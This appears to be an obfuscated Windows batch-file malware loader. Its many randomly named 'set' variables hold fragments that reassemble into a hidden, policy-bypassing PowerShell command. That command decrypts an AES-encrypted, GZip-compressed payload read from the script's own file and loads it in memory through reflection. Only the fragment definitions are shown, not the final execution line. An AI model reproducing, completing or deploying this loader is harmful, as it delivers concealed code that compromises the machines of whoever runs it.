@echo off
set "SkpudFClHu=po"
set "LekutkslmG=do"
set "UFxWqONGhw=1."
set "jcgmuneZqx=Wi"
set "IMeMAYFUtx=xe"
set "nrxTbxylsc=py"
set "FAHJwWdlfI=.e"
set "ubNKUsvBfY=Po"
set "EdQYyUWHHc=:\"
set "VgLnPSveyD=Sy"
set "AREqTxKYGm=s\"
set "HSylptVlIJ=y "
set "NGDjWwgqTd=em"
set "YNtHtqGMfM=ws"
set "aVgdpuWPgV=rs"
set "TrqlbyWujw= /"
set "EkkfhKlEyT=we"
set "lBYMUTMerV=ll"
set "oyOoLkAyvh=ow"
set "nLHMAURFRh=nd"
set "LbGshuAzrp=co"
set "RQSXkvyQdi=rS"
set "tLexeaKEVw=0\"
set "fbnlVEiQAz=\v"
set "PwZRdjbfDi=\W"
set "BAZagjujWm=we"
set "kTYEmhMByS=32"
set "TDUeGJpcTL=he"
set "iSxxzoCCqt=in"
set "dqPzNKoSAj=st"
set "AQkaAZfcKd= C"
set "HQxDYKrzza=he"
set "ORgnbNCnAJ=ll"
set "APzkIJKvYD= %~dp0"
set "EacmTengWp=cd"
set "oPJDGcJrLN=coMI"
set "zxwYowgXOh=0O+g"
set "lzpQsxoFrp=ecry"
set "suNFABtXqQ=ss -"
set "ueOjprdVRn=rtS4"
set "lYJgYQVUVT=16] "
set "HkNANRPaMg=em.I"
set "KokATkxyQS=se()"
set "JQBNwIvdGY=tion"
set "JuYHVfDJRY=)) {"
set "fnMsYQfHhO=pose"
set "FcUAgTshCv=pDZz"
set "nSIqNmfVVQ=aOa."
set "XQqfFjcdPy=e]::"
set "LOZsEjkaHl=f.Pa"
set "BtZpvodRyb=ck($"
set "gYqJeLzHMF=('da"
set "esGIHlGhrX=[Env"
set "BDVTShYpiv=n ''"
set "weBWfYbAhL=Comp"
set "FaLqeMmbrf=ress"
set "JzolqcREEh=bstr"
set "rbnjWQMEMB=);$c"
set "aVggjphUjd=ode]"
set "bgoyRBkOUV=oMIf"
set "IjUAkEcBwd=$Zyb"
set "EsRouuIoUf=);$J"
set "mKzilkVAdv=PM ="
set "yUXrvJtiFg=y.Cr"
set "IwNaTvoiLi=);$V"
set "nFFUpNCALh===')"
set "ARyTJbriAt=yste"
set "wubhnOoFMM=Secu"
set "mtCOMDDeSt=Obje"
set "HYOBfOYxcl=tem."
set "ryDVFoAwtu=ddin"
set "SGMzggIakq=oMIf"
set "AUXpaLrPjT=TsU "
set "YQzUFWTpsY=n ''"
set "FnrJWHHCcT=oMIf"
set "ppiPXPnSBQ=weX."
set "perZkFSGti=OyzA"
set "jsHaphFLzM=ose("
set "hiRwbegUTf=] -j"
set "NoPHZeTJZc=oArr"
set "OCdrpvrVsT=Disp"
set "MhOCTIvyiv=[IO."
set "GtRchaIeGJ=iron"
set "FbEJMcTLqy=daeR"
set "hxFomeJBVi=esFX"
set "HnwIICccwJ=.Cry"
set "CpuSkOHBlU=7;$c"
set "cYTkxBLJmO=ybPM"
set "ijxXRyteIs=.Key"
set "GLwNPtRwbL=em.C"
set "ZWQkHlSFZX=736u"
set "qYehHBcbic=tryP"
set "VjGxgJANXA=am;$"
set "okebrgTCga=-1.."
set "xjLzYYvQQq=tsWi"
set "NyWYKYJksC=)($s"
set "nSIbjJxyln=Disp"
set "RedpfixZiE=fore"
set "ywXAFZabFF=$VCZ"
set "WtIvQZuzcL=[Sys"
set "fLSBtvPwPg=.Mod"
set "owyBHWPwyq=.Dis"
set "KOXnxxsPhH=stem"
set "vmUTcAcjWE=.-16"
set "ImAnHEehBk=t Sy"
set "JLmaVKdaAl=FP.T"
set "xIowvNqJTi=ing("
set "nLvtTklZRo= [st"
set "IFDsZnoGIT=::('"
set "DFAJWlPGBV=ybPM"
set "HkngbZHPPi=);$M"
set "rlgHcjWcTk=eam("
set "AEhVWKBaiz= '')"
set "dRaaiolYOR=6] -"
set "lAyBUQNnch=; };"
set "hfnuiLHypP=Obje"
set "OXNokKyfnj=comp"
set "RoEgyJjQqH== $c"
set "lDtBbGBSbL=Zk, "
set "ZKANpFnJum=ateD"
set "lgBXielxOu=rofi"
set "BqRbDhcwvc=Comp"
set "UOxnUeueSN=flec"
set "dhMemPzdcN='dqR"
set "BjIYkKPTts=oin "
set "VSWBKCCdWu=bjec"
set "NLKApjqEWv='[-1"
set "HGsspyOsRQ=ypto"
set "dfiOyTOEKn=Syst"
set "sAUzfknmwb=ddin"
set "rZnThMulZF=embl"
set "MHpBkBrJNb=gMod"
set "nKrSmjYtyL=y.Ci"
set "mGFnXVWyjY=('%~f0'"
set "ElRBGLcWrE=ispo"
set "tghkXHpvFW=$aNp"
set "bklihMwlaZ=$VCZ"
set "MhnFrcWtzD=gth)"
set "CvKiQFXOPe=J) {"
set "SGyJhyxISS= '')"
set "ohrSOtWVrb== [S"
set "pVzKWRBcqX=m(, "
set "bPmdkUcyDr=lit("
set "UAjJTnRZbE=('%*'"
set "SlvpSCSbbc=join"
set "QZvkvZIZbw=nirt"
set "MkQptXlsoL=3HWs"
set "NjFEQxuCdc=ment"
set "fzzQxGqrXa=.Cre"
set "XwFgcTdFjq=;$Bd"
set "OtqPSknzWh=ach "
set "LDPljMcRZO=6esa"
set "udGJzzVoeg=ke($"
set "ChjGXhweuF=VehR"
set "lYRTEUNcSk=ne);"
set "KoKgVcKGtU=I = "
set "CAKkHGSrkx=File"
set "ovgYkClEUs=ose("
set "aUVkYJSIgo=.Len"
set "hhqJzJRmYT=rans"
set "BmXqoZKXBl=Secu"
set "jYHmyZhxhw=]::("
set "jDrvysGNUw=ct S"
set "VRPemEoNAv=]::("
set "ipDcBrmKDr=VehR"
set "eKYqcJUFgP=ress"
set "QhKvftIEOv=-4] "
set "wzXXOCksJN=X.Su"
set "XTFNasAFkK=brea"
set "NZjngYsjbu=Fo7l"
set "vvvjYBhMmU=bypa"
set "KIBLMHljFb=, $Z"
set "LJdxOAbqqJ=.Con"
set "mDaUsAdMRs=($rW"
set "xWYyMcEDIt=esMa"
set "aqgvWhioLb=k = "
set "sZTcCCcXHy=m.Re"
set "ljdDrHJuKP=FBTs"
set "qcoVHYzeHt=join"
set "WCPklTSrti=S46e"
set "XHYeyGRxSm=CI.D"
set "lSArihCVET=M, 0"
set "iMHnJXOawZ=$BdF"
set "bFDsEJMeGg=U.En"
set "kcmTgzJfex=7Yiv"
set "jCnrkEmdBK=morF"
set "RDWfIIXjWj=ewLi"
set "aaaQyIwxVQ= = ["
set "peSYVJdOSf=ert]"
set "yELsLoEnbf=:('g"
set "TTLajiuIJe=3); "
set "VSXudxLodo=).Sp"
set "jonkSRAqIX=PKCS"
set "vCSTTafxZi=onve"
set "ABiKQBbzAT=1] -"
set "LoZcOLYlfG=FZk."
set "wLxqryiVke=Conv"
set "tSTqHVNDtr=();$"
set "dsrMXppIxW=oint"
set "iyamiKgUmG=..-1"
